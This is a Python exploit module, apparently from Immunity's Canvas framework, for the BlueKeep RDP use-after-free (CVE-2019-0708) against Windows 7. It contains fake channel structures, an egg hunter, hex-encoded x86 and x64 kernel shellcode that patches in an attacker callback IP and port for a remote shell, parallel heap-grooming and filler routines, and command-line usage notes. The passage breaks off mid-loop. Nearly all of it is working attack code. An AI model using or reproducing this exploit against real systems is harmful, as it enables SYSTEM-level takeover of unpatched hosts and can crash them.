#!/usr/bin/env python
##ImmunityHeader v1
################################################################################
## File       :  BLUEKEEP.py
## Description:
##            :
## Created_On :  Tue Jul 16 2019
## Created_By :  {Henry, X.}
##
## (c) Copyright 2015, Immunity, Inc. all rights reserved.
################################################################################

import sys
import os
import signal
import math
import time
import struct
import socket
import select
import logging
import errno
import ctypes
import random
from multiprocessing import Pool, Array, Lock

if '.' not in sys.path:
    sys.path.append('.')

NAME                            = 'BLUEKEEP - Remote command execution (RDP)'
DESCRIPTION                     = 'UAF within the termdd.sys (RDP) driver allows arbitrary code execution with SYSTEM privileges'
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = 'Microsoft'
DOCUMENTATION['Date public']    = ''
DOCUMENTATION['Repeatability']  = ''
DOCUMENTATION["CVE Name"]       = "CVE-2019-0708"
DOCUMENTATION["CVE Url"]        = "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-0708"
DOCUMENTATION['CVSS']           = 10.0

VERSION                         = '0.3'
PROPERTY                        = {}
PROPERTY['TYPE']                = 'Exploit'
PROPERTY['SITE']                = 'Remote'
PROPERTY['ARCH']                = [['Windows']]
PROPERTY['VERSION']             = ['7']

CHANGELOG = """
"""

DOCUMENTATION['NOTES' ]         = """
-- IMPORTANT --
The module is currently in beta stage.

If you do not select "Allow remote code execution" from the module's dialog
it will simply test to see if the target is vulnerable (safe).

This module requires asn1tools to be installed (python) and can only run
on Linux hosts for now (due to our use of ctypes).

prompt-toolkit is an internal dependency of asn1tools, make sure to have a version
on the 2.x branch, ideally 2.0.9. Any version on the 1.x branch should generate errors.
Our linux_installer has been updated to take care of these new dependencies.

Tested against:
    - Windows 7 Ultimate N (x86) [SP1 only]
    - Windows 7 Ultimate (x64) with 2, 4/8 GB of RAM [SP1 only]
    - Windows 7 Enterprise (x64) with 2, 4/8 GB of RAM [SP1 only]
    - Windows 7 Professional (x64) with 4GB of RAM [SP1 only]

In this new release we have included the ability to specify the amount of RAM for
the target system which highly improves reliability and speed. This option is of
course optional, the module is fine-tuned as it is for what reported under
"Tested against". An incorrect value specified for the amount RAM can cause a BSOD
on the target system.

An updated version of the exploit will soon handle more Windows versions.

To get a node on the CLI:
[TERMINAL #1]$ ./commandlineInterface.py -v 17 -p 5555
[TERMINAL #2]$ python2 exploits/remote/windows/BLUEKEEP/BLUEKEEP.py -t 192.168.1.9 -l 192.168.1.10 -d 5555
"""

# Canvas API
from canvasexploit import canvasexploit
import canvasengine
from exploitutils import standard_callback_commandline
from libs import cstruct
from libs.rdp.rdpconst import *
import libs.rdp.mcs as mcs
import libs.rdp.gcc as gcc
import libs.rdp.librdp as librdp
from shellcode import shellcodeGenerator
from localNode import localNode
import ssl

module_path = os.path.dirname(os.path.realpath(__file__))

# Ctypes API
try:
    from ctypes import (
        CDLL, c_int, POINTER, c_void_p, c_size_t,
        c_ssize_t, c_char, ARRAY
    )
except Exception as e:
    logging.error('BLUEKEEP is currently available only on Linux hosts')
    raise ImportError

###
# Globals
###

# Constants
DFLT_RDP_PORT            = 3389
CHANNEL_PKT_SIZE         = CHANNEL_CHUNK_LENGTH
DFLT_NBR_GROOMERS        = 70
DFLT_NBR_FILLERS         = 3
DFLT_NR_REQUIRED_CHUNKS  = 16000
GROOMING_TIME_SLICE      = 5
DFLT_SOCKET_TIMEOUT      = 10

# Number of chunks required
DFLT_REQUIRED_NR_CHUNKS_x86 =  500000
DFLT_REQUIRED_NR_CHUNKS_x64 = 1250000

# Ctypes
MSG_DONTWAIT            = 0x40
MSG_PEEK                = 0x02

# LWP flags
LWP_STATE_ALIVE               = 1
LWP_STATE_DEAD                = 2
LWP_STATE_CONNECTING          = 3
LWP_STATE_SYNCING             = 4
LWP_STATE_MUST_START_GROOMING = 5
LWP_STATE_MUST_STOP_GROOMING  = 6
LWP_STATE_GROOMING            = 7
LWP_STATE_MUST_START_FILLING  = 8
LWP_STATE_MUST_STOP_FILLING   = 9
LWP_STATE_FILLING             = 10
LWP_STATE_MUST_EXIT           = 11

# Variables
gl_req_erect_domain = None
gl_req_client_info = {}
gl_req_synchronize = {}
gl_req_client_confirm_active = {}
gl_req_control_cooperate = {}
gl_req_input = {}
gl_req_control_request_control = {}
gl_req_persistent_key_list = {}
gl_req_client_font_list = {}

# Groomers
groomers_state = Array('i', [ 0 for i in xrange(300) ])
groomers_lock = Lock()
groomers_nr_chunks = Array('i', [ 0 for i in xrange(300) ])

# Fillers
fillers_state = Array('i', [ 0 for i in xrange(10) ])
fillers_lock = Lock()

# Ctypes
try:
    libc = ctypes.CDLL("libc.so.6")
    libc.__errno_location.restype = ctypes.POINTER(ctypes.c_int)
except Exception as e:
    raise ImportError

recv = libc.recv
recv.restype = c_ssize_t
recv.argtypes = c_int, c_void_p, c_size_t, c_int

###
# Target class
###

# x86
X86_POOL_BASE_ADDRESS   = 0xB0000000
X86_DISPATCH_TABLE_ADDR = X86_POOL_BASE_ADDRESS + 0x28
X86_SHELLCODE_ADDR      = X86_POOL_BASE_ADDRESS + 0x30

# x64
X64_POOL_BASE_ADDRESS   = 0xfffffa8018c00000 + 1500 * (1024 * 1024)
X64_DISPATCH_TABLE_ADDR = X64_POOL_BASE_ADDRESS + 0x48
X64_SHELLCODE_ADDR      = X64_POOL_BASE_ADDRESS + 0x50


class Target(object):

    def __init__(self, is_64bit=False):

        self.is_64bit = is_64bit

        self.egg_hunter = None
        self.fake_channel = None
        self.p1 = None
        self.p2 = None
        self.p3 = None
        self.p4 = None
        self.shellcode_parts = []

        if is_64bit:
            self.arch = 'x64'
        else:
            self.arch = 'x86'

    def get_kernel_shellcode_addr(self):
        if self.arch == 'x86':
            return X86_SHELLCODE_ADDR
        else:
            return X64_SHELLCODE_ADDR

    def get_dispatch_table_addr(self):
        if self.arch == 'x86':
            return X86_DISPATCH_TABLE_ADDR
        else:
            return X64_DISPATCH_TABLE_ADDR

    def set_shellcode(self, kshellcode):
        self.shellcode_parts = self.split_shellcode(kshellcode)

    def get_shellcode(self):
        if not self.shellcode_parts:
            raise RuntimeError('Shellcode is not yet initialized!')
        return self.shellcode_parts

    def create_fake_channel(self):
        '''
        This function creates the fake ChannelStruct that replaces the recently
        freed one thanks to the UAF.
        Note: For now it only handles x86.
        '''

        if self.fake_channel:
            return self.fake_channel

        if self.arch == 'x86':
            fake_channel  = '\x00' * 0x80
            fake_channel += struct.pack('<I', 2)                        # Flags to reach "call DispatchTable[0]""
            fake_channel += '\x00' * 8
            fake_channel += struct.pack('<I', X86_DISPATCH_TABLE_ADDR)  # DispatchTable
            fake_channel += '\x00' * (200 - len(fake_channel))
            self.fake_channel = fake_channel
            return fake_channel
        else:
            fake_channel  = '\x00' * 0xEC
            fake_channel += struct.pack('<I', 2)                        # Flags to reach "call DispatchTable[0]""
            fake_channel += '\x00' * 0x10
            fake_channel += struct.pack('<Q', X64_DISPATCH_TABLE_ADDR)      # DispatchTable
            fake_channel += '\x00' * 0x04
            fake_channel += 'ImmY'
            fake_channel += '\x00' * (0x160 - len(fake_channel))
            self.fake_channel = fake_channel
            return fake_channel

    def get_egg_hunter(self):
        if not self.egg_hunter:
            raise RuntimeError('egghunter is not yet initialized!')
        return self.egg_hunter

    def create_egg_hunter(self, shellcode):
        '''
        This function creates the egg_hunter which is the first arbitrary
        code to be executed.
        '''
        if self.egg_hunter:
            return self.egg_hunter

        if self.arch == 'x86':
            fname = 'eggx86'
        else:
            fname = 'eggx64'

        # Compiled version of payloads/egg{x86,x64}.asm
        f = open(os.path.join(module_path, 'payloads', fname))
        egg_hunter = f.read()
        f.close()

        if self.arch == 'x86':
            size_of_part = (1600 - 0x28 - len(egg_hunter)) / 0x100
            size_of_part = 0x100 * size_of_part
            nr_of_parts  = int(math.ceil(len(shellcode) / float(size_of_part)))
            egg_hunter = egg_hunter[:0xBB] + struct.pack('<I', size_of_part) + egg_hunter[0xBB+4:]
            egg_hunter = egg_hunter[:0xC4] + struct.pack('<I', size_of_part) + egg_hunter[0xC4+4:]
            egg_hunter = egg_hunter[:0x6E] + struct.pack('<B', nr_of_parts)  + egg_hunter[0x6E+1:]
        else:
            size_of_part = (1600 - 0x40 - len(egg_hunter)) / 0x100
            size_of_part = 0x100 * size_of_part
            nr_of_parts  = int(math.ceil(len(shellcode) / float(size_of_part)))
            egg_hunter = egg_hunter[:0x10B] + struct.pack('<I', size_of_part) + egg_hunter[0x10B+4:]
            egg_hunter = egg_hunter[:0x11D] + struct.pack('<I', size_of_part) + egg_hunter[0x11D+4:]
            egg_hunter = egg_hunter[:0xBC] + struct.pack('<B', nr_of_parts)  + egg_hunter[0xBC+1:]

        self.egg_hunter = egg_hunter
        return size_of_part


    def get_p1(self):
        if self.p1:
            return self.p1
        if not self.fake_channel:
            self.create_fake_channel()
        if self.arch == 'x86':
            self.p1  = librdp.ChannelPDUHeader(CHANNEL_FLAG_FIRST, 16000).pack()
            self.p1 += self.fake_channel[0x20:]
        else:
            self.p1  = librdp.ChannelPDUHeader(CHANNEL_FLAG_FIRST, 16000).pack()
            self.p1 += self.fake_channel[0x38:]

        return self.p1

    def get_p2(self):
        if self.p2:
            return self.p2
        if self.arch == 'x86':
            self.p2  = librdp.ChannelPDUHeader(0, 16000).pack()
            self.p2 += struct.pack('<I', X86_SHELLCODE_ADDR) * 2 # Beginning of data
        else:
            self.p2  = librdp.ChannelPDUHeader(0, 16000).pack()
            self.p2 += struct.pack('<Q', X64_SHELLCODE_ADDR)     # Beginning of data

        return self.p2

    def get_p3(self):
        if self.p3:
            return self.p3
        if not self.fake_channel:
            self.create_fake_channel()
        if self.arch == 'x86':
            self.p3  = librdp.ChannelPDUHeader(CHANNEL_FLAG_FIRST, 16000).pack()
            self.p3 += self.fake_channel[0x20:]
        else:
            self.p3  = librdp.ChannelPDUHeader(CHANNEL_FLAG_FIRST, 16000).pack()
            self.p3 += self.fake_channel[0x38:]
        return self.p3

    def get_p4(self):
        if self.p4:
            return self.p4
        if not self.fake_channel:
            self.create_fake_channel()
        if self.arch == 'x86':
            self.p4  = librdp.ChannelPDUHeader(0, 16000).pack()
            self.p4 += self.fake_channel[0x20:]
        else:
            self.p4  = librdp.ChannelPDUHeader(0, 16000).pack()
            self.p4 += self.fake_channel[0x38:]
        return self.p4

    ###
    # Shellcodes
    ###

    def __create_kernel_shellcode_x86(self, usershellcode):
        '''
        Creates the x86 kernel shellcode that will be executed for the egghunter.
        '''

        shellcode  = '5553575683ec38e8000000005b31c04064a22400000081c3f4ffffffe86203000085c0742f8d939d04000089c1e8f502000089c185c9741c8d74243489742404c7042404000000ffd183ec088b0689442420eb008d836e040000895c242c8944242889dee81a03000085c074258d968304000089c189f3e8ab02000089c185c974108b44242089f3890424ffd183ec04eb048b4424206afb598b54242889542424eb0f84d289d80f8485000000ff4424244185c9747c0fb654080589c38d72bf8d6a206a1a5839c68b7424240f43ea0fb6368d7ebf39c78d46200f43c639c574c22b5c242081fb380400007420b98801000081fbe0020000741881fb6c' # db ffd00303
        shellcode += '0100000f850a020000b9b8000000eb05b9380200008b4424208b5c242c8b040829c839442434894424200f8535ffffffe9de010000837c2420000f84d30100008b5c242ce83d02000085c0b90000000074248d93b804000089c1e8cb01000085c0b900000000740e8b4c2420890c24ffd083ec0489c18b442420894c24288b782c8d83fd040000894424208d837404000089442430897c2424e96b0100003b7c24240f846b0100008b5c242c8db720feffffe8cf01000031ed85c0741b8d93c704000089c1e86001000085c0740a893424ffd083ec0489c53b6c2428b8000000000f45f0e89d01000085c00f84180100008b54242089c1e82e01000085c00f8405010000893424ffd083ec0485c00f84f5000000e86d01000085c00f84e80000008b54243089c1e8fe00000085c00f84d5000000c74424043000000083242400ffd083ec0889c585ed0f84ba000000e83201000085c00f84ad0000008d93dc04000089c1e8c100000085c00f84980000008b4c244c8d93a7030000894c241c894c24148954240c89742404892c24c74424180100000083642410008364240800ffd083ec20e8dc00000085c074528d93ec04000089c1e86f00000089c185c9743fb80200000064a2240000008b442450894424088b44244c89442404892c248364240c00ffd183ec1089c131c04064a22400000084c97411807e5601750beb1d' # db 0xffd00000+400 L200
        shellcode += '31c04064a2240000008b3f85ff0f858bfeffff31c083c4385e5f5b5dc3b80200000064a224000000ebe9555357565089142431ff8b413c8b7401788b543118eb1e8b4431208b2c2401c88b04b801c8eb0684db740e40458a183a5d0074f34739d772de31c039d774158b4431248b54311c01c801ca0fb70478030c8289c883c4045e5f5b5dc36a1c58648b008b4838b800f0ffff234104eb050500f0ffff80384d75f68078015a75f0c3535683ec208b44243cb9002000008b742430e8000000005b81c342fcffff03088364241800894c241ce8aeffffff85c074438d935604000089c1e841ffffff85c074328d4c241c8d542418894c240c89542404c744241440000000c7442410001000008364240800830c24ffffd083ec1885c0740b83260083c4205e5bc214008b5424388b4c2418b80020000001c18b122b44241ceb078a1a424088194185c075f5b800200000034424188906ebc95a77416c6c6f636174655669727475616c4d656d6f7279006c73617373004578416c6c6f63617465506f6f6c00507347657450726f63657373496d61676546696c654e616d650050734c6f6f6b757050726f63657373427950726f63657373496400507347657450726f63657373496400507347657454687265616450726f636573734964004b65496e697469616c697a65417063004b65496e73657274517565756541706300' # db 0xffd00000+600 L200
        shellcode += '507347657454687265616454656200'
        shellcode  = shellcode.decode('hex')

        callcode  = '\xe8'+struct.pack("<I", len(usershellcode))     # call +
        callcode += usershellcode                                    # (jumped over)
        callcode += '\x59'                                           # pop ecx
        callcode += '\x60'                                           # pushad
        callcode += '\x68'+struct.pack("<I", len(usershellcode))     # push SC_LENGTH
        callcode += '\x51'                                           # push &SC
        # call kernel_shellcode(usershellcode, len(usershellcode))
        callcode += '\xe8'+struct.pack("<I", 4)                      # call kernel_land_shellcode
        callcode += '\x59'                                           # pop ecx
        callcode += '\x59'                                           # pop ecx
        callcode += '\x61'                                           # popad
        callcode += "\xc3"                                           # ret
        # return sc_kernel_remote
        return callcode + shellcode

    def __create_kernel_shellcode_x64(self, callback_ip, callback_port):
        '''
        Creates the x64 kernel shellcode that will be executed for the egghunter.
        '''
        kshellcode  = '4157415641554154565755534883ec584831c948ffc1440f22c1b8180000006567488b00488b403848c7c100f0ffff48234804eb074881c100f0ffff80394d75f48079015a75ee488d153c0c0000e8410300004885c07411488d542450b904000000ffd04c8b742450b8180000006567488b00488b403848c7c100f0ffff48234804eb074881c100f0ffff80394d75f48079015a75ee488d15d30b0000e8f20200004889c24885d274074c89f1ffd2eb034c89f031c941b91a0000004c8d05980b0000eb0348ffc14883f90574630fb61c088d73bf8d7b204439ce0f43fb420fb634018d6ebf8d56204439cd0f43d639d7750684db75ceeb384c29f0b9'
        kshellcode += '88010000483de00200007411483d380400000f856c020000b9380200004d8b340e4929ce4c3b7424500f853dffffffe9500200004d85f60f8447020000b8180000006567488b00488b403848c7c100f0ffff48234804eb074881c100f0ffff80394d75f48079015a75ee488d15370b0000e82102000031f64885c074084c89f1ffd04889c6498b5e3041be1800000049c7c700f0ffff488d3d1a0b00004989ddeb0a4831c948ffc1440f22c14d8b6d004939dd0f84cb0100004d85ed0f84c2010000498dad08fdffff6567498b06488b4038488b48044c21f9eb074881c100f0ffff80394d75f48079015a75ee4889fae8a20100004885c0b900000000'
        kshellcode += '74084889e9ffd04889c14839f1b800000000480f45e84889e9e8e50100004885c0748c6567498b06488b4038488b48044c21f9eb074881c100f0ffff80394d75f48079015a75ee488d15190a0000e8470100004885c00f8453ffffff31c9ba58000000ffd04989c44d85e40f843effffff6567498b06488b4038488b48044c21f9eb074881c100f0ffff80394d75f48079015a75ee488d15330a0000e8f90000004885c00f8405ffffff488d0d6c02000048894c243848894c2428c74424300100000048c7442420000000004531c04c89e14889ea4c8d0d80010000ffd06567498b06488b4038488b48044c21f9eb074881c100f0ffff80394d75f480'
        kshellcode += '79015a75ee488d15d6090000e88c0000004885c00f848efeffff48c7c102000000440f22c141b82c0700004531c94c89e1488d15e8010000ffd04831c948ffc1440f22c184c00f8466feffff4889e9e8b2000000483985b8000000b97a0000007412483985f0000000b9c20000000f853efeffff807c0d00010f8533feffff48c7c102000000440f22c131c04883c4585b5d5f5e415c415d415e415fc3538b413c448b8c0188000000468b5409184531c0eb0349ffc04d39d07325428b4409204801c8468b1c804901cb4889d0eb0649ffc348ffc0418a1b3a1875d784db75ef31c04539d0741d428b44091c428b5409244801ca4489c34801c80fb714'
        kshellcode += '5a8b04904801c85bc3564883ec204889ceb8180000006567488b00488b403848c7c100f0ffff48234804eb074881c100f0ffff80394d75f48079015a75ee488d15b1080000e856ffffff4885c0740b4889f14883c4205e48ffe031c04883c4205ec35657534883ec404c89cf4889d3488b842480000000488b00488944243848c744243000000000b8180000006567488b00488b403848c7c100f0ffff48234804eb074881c100f0ffff80394d75f48079015a75ee488d1593070000e8dffeffff4885c0742ac744242840000000c744242000100000488d5424304c8d4c243848c7c1ffffffff4531c0ffd085c0740948c70300000000eb22488b7424'
        kshellcode += '30488b0f488b54243831ffeb098a043988043e48ffc74839fa75f24889334883c4405b5f5ec365488b0425300000004883b8c802000000750e488d0dea060000488988c80200004883ec38488b0d24060000488d41014883f801771b488d0d5c060000e8b70100004889c148890d040600004885c97432488d156a060000e8e80100004885c0742148c744242800000000c7442420000000004c8d058902000031c931d24531c9ffd0b8ffffffff4883c438c3415741565657555365488b0425600000004c8b48184983c13031c06641be1a004c8d05a40500004d8b094d85c974574d89cb4983c3e074454d8b53304d85d2743c4d8b7b6031f6eb0448'
        kshellcode += '83c602410fb73c378d5fbf8d6f20664439f30f43ef420fb71c068d53bf8d4b20664439f20f43cb39cd75b26685ff75cf4c89d05b5d5f5e415e415fc3498b4330ebf15657534883ec204489c64889d74889cb488b0d18050000488d41014883f801771b488d0d65050000e8b30000004889c148890df80400004885c97427488d1516050000e8e40000004885c074164531c94889d94889fa4189f04883c4205b5f5e48ffe0b8ffffffff4883c4205b5f5ec35657534883ec204489c64889d74889cb488b0da8040000488d41014883f801771b488d0df5040000e8430000004889c148890d880400004885c97427488d15f1040000e8740000004885c0'
        kshellcode += '74164531c94889d94889fa4189f04883c4205b5f5e48ffe0b8ffffffff4883c4205b5f5ec3564883ec204889ce488b05ec0400004885c07525e87bfeffff4885c07426488d15c90400004889c1e874000000488905c70400004885c0740b4889f14883c4205e48ffe031c04883c4205ec356574883ec284889d64889cf488b05a40400004885c07525e82bfeffff4885c0742a488d15110400004889c1e8240000004889057f0400004885c0740f4889f94889f24883c4285f5e48ffe031c04883c4285f5ec3538b413c448b8c0188000000468b5409184531c0eb0349ffc04d39d07325428b4409204801c8468b1c804901cb4889d0eb0649ffc348ff'
        kshellcode += 'c0418a1b3a1875d784db75ef31c04539d0741d428b44091c428b5409244801ca4489c34801c80fb7145a8b04904801c85bc3415741565657534881ecf0010000488b0d30030000488d41014883f801771f488d0d7d030000e8cbfeffff4889c148890d100300004885c90f84f3020000488d1546030000e8f8feffff4885c00f84de020000488d542438b902000000ffd085c00f85ca020000488b0dd7020000488d41014883f801771f488d0d24030000e872feffff4889c148890db70200004885c90f849a020000488d153b030000e89ffeffff4885c00f848502000031c9894c2428894c2420b902000000ba0100000041b8060000004531c9ffd0'
        kshellcode += '4889c6b8100000004883feff7510e953020000c68404d70100000048ffc84885c075f066c78424d8010000020066c78424da010000babec78424dc010000deadbeef488b0d31020000488d41014883f801771f488d0d7e020000e8ccfdffff4889c148890d110200004885c90f84f4010000488d1530020000e8f9fdffff4885c00f84df010000488d9424d801000041b8100000004889f1ffd083f8ff0f84c3010000c78424d00100000000000231ff4883ff047428488d943cd001000041b8040000004129f84889f1e8ecfcffff48984801c783f8ff75d7e988010000c78424d00100000000000031ff4883ff047428488d943cd001000041b80400'
        kshellcode += '00004129f84889f1e8b1fcffff48984801c783f8ff75d7e94d01000031ffeb0548984801c74883ff047426488d943cec01000041b8040000004129f84889f1e80afcffff8d480183f90273d4e918010000440fb6b424ef0100000fb69c24ee0100000fb6bc24ed010000440fb6bc24ec010000488b0d0b010000488d41014883f801771f488d0d43010000e89efcffff4889c148890deb0000004885c90f84c6000000488d155a010000e8cbfcffff4885c00f84b100000049c1e61848c1e3104c09f348c1e7084809df4c09ff31db31c941b80030000041b9400000004889faffd04989c64d85f67507eb7d48984801c34839df7466498d141e4189f8'
        kshellcode += '4129d84889f1e846fbffff8d480183f90273dc488b0d6e000000488d41014883f801771b488d0da6000000e801fcffff4889c148890d4e0000004885c9742d488d15a3000000e832fcffff4885c0741c31d241b8008000004c89f1ffd0eb0d48897424304c8b7c243041ffd6b8ffffffff4881c4f00100005b5f5e415e415fc3ffffffffffffffffffffffffffffffff6b00650072006e0065006c00330032002e0064006c006c0000007265637600636f6e6e6563740047657450726f63416464726573730057534153746172747570006b65726e656c33322e646c6c007773325f33322e646c6c005669727475616c467265650073656e6400437265'
        kshellcode += '617465546872656164005669727475616c416c6c6f6300575341536f636b657457004c6f61644c696272617279410000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005a77416c6c6f636174655669727475616c4d656d6f7279006c73617373004578416c6c6f63617465506f6f6c00507347657450726f63657373496d61676546696c654e616d650050734c6f6f6b757050726f63657373427950726f63657373496400507347657450726f63657373496400507347657454687265616450726f636573734964004b65496e697469616c697a6541706300'
        kshellcode += '4b65496e73657274517565756541706300507347657454687265616454656200'
        kshellcode  = kshellcode.decode('hex')

        kshellcode = kshellcode[:0x91A] + struct.pack(">H", callback_port) + kshellcode[0x91A + 2:]
        kshellcode = kshellcode[:0x923] + socket.inet_aton(callback_ip)    + kshellcode[0x923 + 4:]

        return kshellcode


    def create_kernel_shellcode(self, *args):
        if self.is_64bit:
            return self.__create_kernel_shellcode_x64(*args)
        else:
            return self.__create_kernel_shellcode_x86(*args)

    def split_shellcode(self, shellcode):
        '''
        Splits the shellcode into pieces so that it fits in VC chunks!
        '''
        nr_pages = int(math.ceil(len(shellcode)/1024.0))
        shellcode = shellcode.rjust(nr_pages * 1024, '\x90')

        i = 0
        size_part = self.create_egg_hunter(shellcode)
        while i < len(shellcode):
            self.shellcode_parts.append(shellcode[i:i+size_part])
            i += size_part

        return self.shellcode_parts


current_target = None


###
# LWP API
###


def init_groomer(l, args):
    '''
    Allows to prepare arguments for a groomer.
    '''
    global groomers_lock
    global parameters
    groomers_lock = l
    parameters = args

def init_filler(l, args):
    '''
    Allows to prepare arguments for a filler.
    '''
    global fillers_lock
    global parameters
    fillers_lock = l
    parameters = args

def start_filler(proc_index):
    '''
    Main function executed by LWP of type fillers.
    Can be forced to exit by setting the corresponding flag to LWP_STATE_DEAD.

    Note: Might still hang in the case of a target crash.
    '''

    def set_status(status):
        fillers_lock.acquire()
        fillers_state[proc_index] = status
        fillers_lock.release()

    def get_status():
        fillers_lock.acquire()
        status = fillers_state[proc_index]
        fillers_lock.release()
        return status

    p3 = current_target.get_p3()
    p4 = current_target.get_p4()

    try:

        proc_name = 'LWP_F_%05d' % proc_index
        set_status(LWP_STATE_ALIVE)
        logging.info('%s: changed status to \'alive\'' % proc_name)

        host = parameters['host']
        port = parameters['port']
        nr_connections = parameters['nr_connections']

        set_status(LWP_STATE_CONNECTING)

        fd_array = create_tcp_connections(host, port, nr_connections)
        if not fd_array or not len(fd_array):
            logging.error('%s: failed to create %d TCP connection(s)!' % (proc_name, nr_connections))
            set_status(LWP_STATE_DEAD)
            return -2, None

        rdp_array = []
        start = time.time()

        for fd in fd_array:
            rdp_obj = HackedRDP(fd, tag=proc_name)
            ret = rdp_obj.connect(with_tls=True, idx=proc_index)
            if not ret:
                rdp_array += [rdp_obj]

        end = time.time()
        time_taken = end - start

        if not rdp_array or not len(rdp_array):
            logging.error('%s: failed to create %d RDP connections!' % (proc_name, len(fd_array)))
            set_status(LWP_STATE_DEAD)
            return -3, None

        logging.info('\t-> %d RDP connection(s) created in %.3f (s)' % (len(fd_array), time_taken))

        start = time.time()
        for rdp_idx in xrange(len(rdp_array)):
            rdp = rdp_array[rdp_idx]
            rdp.set_timeout(3)
            ret = rdp.perform_handcheck(with_bug=True)
            rdp.set_timeout(DFLT_SOCKET_TIMEOUT)
            if ret:
                logging.error('%s: failed to create an RDP session [fd=%d, err=%d]!' % (proc_name, rdp.get_fd(), ret))
                rdp.close()
                del(rdp_array[rdp_idx])
                continue

        end = time.time()
        time_taken = end - start

        if not len(rdp_array):
            logging.error('%s: failed to perform %d RDP handchecks' % (proc_name, len(fd_array)))
            set_status(LWP_STATE_DEAD)
            return -4, None

        logging.info('\t-> %d RDP/TLS handcheck(s) performed in %.3f (s)' % (len(rdp_array), time_taken))

        set_status(LWP_STATE_SYNCING)
        while 1:

            logging.info("%s: sending a keep-alive" % proc_name)
            for rdp in rdp_array:
                rdp.set_timeout(3)
                ret, _ = rdp.send_input()
                rdp.set_timeout(DFLT_SOCKET_TIMEOUT)
                if ret:
                    logging.error('%s: failed to send the keep-alive! [1]' % (proc_name))
                    set_status(LWP_STATE_DEAD)
                    return -11, None

            # No need to send a keep-alive more than one per second
            time.sleep(1)

            status = get_status()
            if status == LWP_STATE_MUST_START_FILLING:
                logging.info("%s: ordered to start filling!" % proc_name)
                break

            # For safety only. Should never be reached
            if status == LWP_STATE_MUST_EXIT:
                logging.warn("%s: ordered to die from an invalid stage! [Race Condition!]" % proc_name)
                set_status(LWP_STATE_DEAD)
                return -9, None

        set_status(LWP_STATE_FILLING)
        while 1:

            # TODO: We may hang here if the exploit fails
            for j in xrange(20):
                for rdp in rdp_array:
                    logging.info("%s: sending a poisoned chunk!", proc_name)
                    ret, _ = rdp.send_data(p3, p4, with_flush=False)
                    if ret:
                        logging.error('%s: failed to send data!' % (proc_name))
                        set_status(LWP_STATE_DEAD)
                        return -10, None

            status = get_status()
            if status == LWP_STATE_MUST_STOP_FILLING:
                logging.info("%s: ordered to stop filling!" % proc_name)
                break

            # For safety only. Should never be reached
            if status == LWP_STATE_MUST_EXIT:
                logging.warn("%s: ordered to die!" % proc_name)
                break

        set_status(LWP_STATE_DEAD)
        logging.info('%s: now ready to die...' % proc_name)
        return 0, []

    except Exception as e:
        logging.error('%s: an unexpected error killed me! (%s)' % (proc_name, str(e)))
        set_status(LWP_STATE_DEAD)
        return -1, None

def start_groomer(proc_index, with_tls=True):
    '''
    Main function executed by LWP of type groomers.
    Can be forced to exit by setting the corresponding flag to LWP_STATE_DEAD.
    '''

    global current_target

    def set_status(status):
        groomers_lock.acquire()
        groomers_state[proc_index] = status
        groomers_lock.release()

    def get_status():
        groomers_lock.acquire()
        status = groomers_state[proc_index]
        groomers_lock.release()
        return status

    def build_packet2(index=0, nop='\x90'):
        if current_target.is_64bit:
            length = 1600 - 0x38 - 8
        else:
            length = 1600 - 0x20 - 8

        packet2  = current_target.get_egg_hunter()
        packet2 += 'ImmX' * 2
        packet2 += struct.pack('<I', index)
        packet2 += current_target.get_shellcode()[index]
        return nop * (length - len(packet2)) + packet2

    try:
        proc_name = 'LWP_G_%05d' % proc_index
        set_status(LWP_STATE_ALIVE)
        logging.debug('%s: changed status to \'alive\'' % proc_name)

        host = parameters['host']
        port = parameters['port']
        nr_connections = parameters['nr_connections']
        nr_expected_chunks = parameters['nr_expected_chunks']

        p1 = current_target.get_p1()
        p2 = current_target.get_p2()
        shellcode_parts = current_target.get_shellcode()

        p2_ = []
        for i in xrange(len(shellcode_parts)):
            p2_.append(p2 + build_packet2(index=i))

        set_status(LWP_STATE_CONNECTING)

        fd_array = create_tcp_connections(host, port, nr_connections)
        if not fd_array or not len(fd_array):
            logging.error('%s: failed to create %d TCP connection(s)!' % (proc_name, nr_connections))
            set_status(LWP_STATE_DEAD)
            return -2, None

        rdp_array = []
        start = time.time()

        for fd in fd_array:
            rdp_obj = HackedRDP(fd, tag=proc_name)
            if with_tls:
                ret = rdp_obj.connect(with_tls=True, idx=proc_index)
            else:
                ret = rdp_obj.connect(with_tls=False, idx=proc_index)
            if not ret:
                rdp_array += [rdp_obj]

        end = time.time()
        time_taken = end - start

        if not rdp_array or not len(rdp_array):
            logging.error('%s: failed to create %d RDP connections!' % (proc_name, len(fd_array)))
            set_status(LWP_STATE_DEAD)
            return -3, None

        logging.info('\t-> %d RDP connection(s) created in %.3f (s)' % (len(fd_array), time_taken))

        start = time.time()
        for rdp_idx in xrange(len(rdp_array)):
            rdp = rdp_array[rdp_idx]
            rdp.set_timeout(3)
            ret = rdp.perform_handcheck(with_bug=True)
            rdp.set_timeout(DFLT_SOCKET_TIMEOUT)
            if ret:
                logging.error('%s: failed to create an RDP session [fd=%d, err=%d]!' % (proc_name, rdp.get_fd(), ret))
                rdp.close()
                del(rdp_array[rdp_idx])
                continue

        end = time.time()
        time_taken = end - start

        if not len(rdp_array):
            logging.error('%s: failed to perform %d RDP handchecks!' % (proc_name, len(fd_array)))
            set_status(LWP_STATE_DEAD)
            return -4, None

        logging.info('\t-> %d RDP handcheck(s) performed in %.3f (s)' % (len(rdp_array), time_taken))

        set_status(LWP_STATE_SYNCING)
        while 1:

            if not (proc_index % 15):
                logging.info("%s: sending a keep-alive [1]" % proc_name)
            for rdp in rdp_array:
                rdp.set_timeout(3)
                ret, _ = rdp.send_input()
                rdp.set_timeout(DFLT_SOCKET_TIMEOUT)
                if ret:
                    logging.error('%s: failed to send the keep-alive! [1]' % (proc_name))
                    set_status(LWP_STATE_DEAD)
                    return -5, None

            # No need to send a keep-alive more than one per second
            time.sleep(1)
            status = get_status()

            if status == LWP_STATE_MUST_START_GROOMING:
                if not (proc_index % 15):
                    logging.info("%s: ordered to start grooming!" % proc_name)
                break

            # For safety only. Should never be reached
            if status == LWP_STATE_MUST_EXIT:
                logging.warn("%s: ordered to die from an invalid stage! [Race Condition!]" % proc_name)
                set_status(LWP_STATE_DEAD)
                return -9, None

        total_nr_chunks = 0

        set_status(LWP_STATE_GROOMING)
        while total_nr_chunks < nr_expected_chunks:

            for rdp in rdp_array:
                rdp.set_timeout(3)
